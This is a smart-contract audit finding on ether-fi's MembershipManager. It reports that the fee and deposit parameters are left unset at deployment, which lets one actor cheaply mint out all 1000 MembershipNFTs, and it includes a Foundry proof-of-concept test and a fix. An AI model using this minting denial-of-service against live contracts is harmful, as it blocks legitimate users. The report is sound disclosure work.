# [M] Malicious actor can immediately mint out all `MembershipNFT`s and prevent other users from minting

## Summary
Severity: Medium
Chain: Smart contract
Component: ether-fi
Published: 2023-11-09
Source: https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/issues/39
Type: hats-finding

## Details
**Github username:** @0xfuje
**Submission hash (on-chain):** 0xd8013528d4d856d092e156744798f81e276a22a1acb93c083ba1a3b55f667546
**Severity:** medium

**Description:**
## Description
The `minDepositGwei` and `mintFee`variable in `MemberShipManager` prevents an attacker from minting out all `MembershipNFT`s low cost. To set `minDepositGwei` and `mintFee` the owner of the contract has to call `setDepositAmountParams()` and `setFeeAmounts()`.

`src/MembershipManager.sol` - [`setDepositAmountParams()`](https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/blob/180c708dc7cb3214d68ea9726f1999f67c3551c9/src/MembershipManager.sol#L344-L351)
```solidity
    /// @notice Updates minimum valid deposit
    /// @param _minDepositGwei minimum deposit in wei
    /// @param _maxDepositTopUpPercent integer percentage value
    function setDepositAmountParams(uint56 _minDepositGwei, uint8 _maxDepositTopUpPercent) external {
        _requireAdmin();
        minDepositGwei = _minDepositGwei;
        maxDepositTopUpPercent = _maxDepositTopUpPercent;
    }
```

`src/MembershipManager.sol` - [`setFeeAmounts()`](https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/blob/180c708dc7cb3214d68ea9726f1999f67c3551c9/src/MembershipManager.sol#L344-L351)
```solidity
    function setFeeAmounts(uint256 _mintFeeAmount, uint256 _burnFeeAmount, uint256 _upgradeFeeAmount, uint16 _burnFeeWaiverPeriodInDays) external {
        _requireAdmin();
        _feeAmountSanityCheck(_mintFeeAmount);
        _feeAmountSanityCheck(_burnFeeAmount);
        _feeAmountSanityCheck(_upgradeFeeAmount);
        mintFee = uint16(_mintFeeAmount / 0.001 ether);
        burnFee = uint16(_burnFeeAmount / 0.001 ether);
        upgradeFee = uint16(_upgradeFeeAmount / 0.001 ether);
        burnFeeWaiverPeriodInDays = _burnFeeWaiverPeriodInDays;
    }
```


The problem that allows this exploit is that the fee and deposit params are not set immediately upon contract deployment or initialization. This allows for an exploit where an attacker front-runs or simply mints out all of the `MemberShipNFT`s before the deposit params are set. This would prevent other users from minting.

The current maximum mintable tokens are set to 1000 in `MemberShipNFT.sol`:
`src/MembershipNFT.sol` - [`initialize()`](https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/blob/180c708dc7cb3214d68ea9726f1999f67c3551c9/src/MembershipNFT.sol#L53-L60)
```solidity
    function initialize(...) external initializer {
        maxTokenId = 1000;
    }
```

The minimum amount the attacker has to deposit for each `nft` via `wrapEth()` is only `1 wei` as the `LiquidityPool` requires non-zero amount of deposit. The attacker would only have to cover gas costs beside `1000 wei` to mint out all the `MembershipNFT`s which is approximately `2.066` `ETH` calculating with an average gas cost of `20 gwei` on `ETH`.


`src/MembershipManager.sol` - [`wrapEth()`](https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/blob/180c708dc7cb3214d68ea9726f1999f67c3551c9/src/MembershipManager.sol#L140-L153)
```solidity
    /// @notice Wraps ETH into a membership NFT.
    /// @dev This function allows users to wrap their ETH into membership NFT.
    /// @param _amount amount of ETH to earn staking rewards.
    /// @param _amountForPoints amount of ETH to boost earnings of {loyalty, tier} points
    /// @return tokenId The ID of the minted membership NFT.
    function wrapEth(uint256 _amount, uint256 _amountForPoints, address _referral) public payable whenNotPaused returns (uint256) {
        uint256 feeAmount = uint256(mintFee) * 0.001 ether;
        uint256 depositPerNFT = _amount + _amountForPoints;
        uint256 ethNeededPerNFT = depositPerNFT + feeAmount;

        if (depositPerNFT / 1 gwei < minDepositGwei || msg.value != ethNeededPerNFT) revert InvalidDeposit();

        return _wrapEth(_amount, _amountForPoints, _referral);
    }
```

It's worth to mention even if the owner would set the deposit and fee params in a deployment script (which is not currently the case), the attacker still has a good chance to front-run the transactions and mint out a significant portion of `MembershipNFT` without fees and minimum deposit.

## Proof of Concept
1. navigate to `MembershipManager.t.sol`
2. copy the below proof of concept inside `MembershipManagerTest` contract
3. run `forge test --match-test test_MintDoS_0xfuje -vvvv`
```solidity
    function test_MintDoS_0xfuje() public {
        address haxor = vm.addr(1337);
        deal(haxor, 1 ether);
        
        // simulate front-running with setting minDepositGwei var back to zero
        // aka the initial value at contract deployment
        vm.prank(alice);
        membershipManagerV1Instance.setDepositAmountParams(uint56(0), uint8(0));

        uint256 gasPrice = 20; // 20 gwei is the average gas price on ETH in the last month
        uint256 gasStart = gasleft();
        
        vm.startPrank(haxor);
        for (uint256 i; i < 1000; i++) {
            membershipManagerInstance.wrapEth{value: 1}(1, 0);
        }
        vm.stopPrank();

        uint256 gasEnd = gasleft();
        uint256 gasUsedGwei = ((gasStart - gasEnd) * gasPrice);

        emit log_uint(gasUsedGwei / 1 gwei);
        // gas costs are 2.0466 ETH approximiately to execute this attack

        // any new mints will revert since token reached maxTokenId
        vm.prank(bob);
        vm.expectRevert();
        membershipManagerInstance.wrapEth{value: 1}(1, 0);
    }
```

## Recommendation
Consider adding an `initialize()` function in `MembershipManager.sol` and setting the initial deposit and fee params there via `setDepositAmountParams()` and `setFeeAmounts()` to prevent this attack vector.
